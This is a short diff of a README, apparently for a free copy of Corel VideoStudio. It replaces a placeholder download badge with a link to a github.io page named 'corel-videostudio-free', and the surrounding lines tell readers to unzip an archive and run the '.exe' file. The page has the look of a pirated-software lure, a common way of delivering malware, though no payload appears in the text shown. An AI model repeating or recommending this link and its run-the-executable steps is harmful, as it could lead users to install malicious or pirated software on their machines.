@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://corel-videostudio-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="1920" height="1040" alt="corel-videostudio-main-interface" src="https://github.com/user-attachments/assets/d5f833f2-722c-46c9-8082-9c15d8946000" />
